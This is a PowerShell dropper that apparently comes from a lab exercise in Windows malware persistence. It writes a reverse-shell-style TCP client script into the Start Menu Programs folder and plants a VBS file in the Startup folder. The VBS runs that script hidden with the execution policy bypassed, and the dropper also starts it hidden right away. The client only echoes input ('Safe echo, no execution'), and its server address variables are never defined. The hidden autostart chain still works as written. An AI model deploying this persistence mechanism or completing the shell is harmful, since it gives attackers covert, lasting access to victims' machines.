# Paths
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ps1Path = Join-Path $programsPath "code2.ps1"
$ps1Content = @'
try {
    $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
    $s = $c.GetStream()
    [byte[]]$b = 0..65535 | % {0}

    while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
        $d = ([Text.Encoding]::ASCII).GetString($b, 0, $i)
        # Safe echo, no execution
        $r2 = "Executed safely in lab: $d PS " + (pwd).Path + "> "
        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2), 0, $r2.Length)
        $s.Flush()
    }

    $c.Close()
} catch {
    # silently ignore connection errors
}
'@

Set-Content -Path $ps1Path -Value $ps1Content -Force
$vbsPath = Join-Path $startupPath "RunHidden.vbs"

$vbsContent = @'
Dim objShell
Set objShell = CreateObject("Wscript.Shell")

' Path to your PowerShell script
psScript = "C:\Users\PRINCI\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\code2.ps1"

' Command to run PowerShell hidden
cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"

' 0 = hidden, False = don't wait
objShell.Run cmd, 0, False
'@

Set-Content -Path $vbsPath -Value $vbsContent -Force
$cscript = "cscript.exe //nologo `"$vbsPath`""
Start-Process -FilePath "cscript.exe" -ArgumentList "//nologo", "`"$vbsPath`"" -WindowStyle Hidden
